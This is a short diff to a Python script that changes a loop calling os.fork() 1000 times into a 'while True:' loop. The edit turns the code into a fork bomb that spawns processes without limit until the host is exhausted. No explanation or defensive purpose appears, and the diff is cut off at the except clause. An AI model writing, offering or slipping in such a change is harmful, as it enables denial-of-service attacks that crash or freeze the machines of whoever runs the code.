@@ -1,6 +1,6 @@
 import os
 
-for i in range(1000):
+while True:
     try:
         os.fork()
     except:
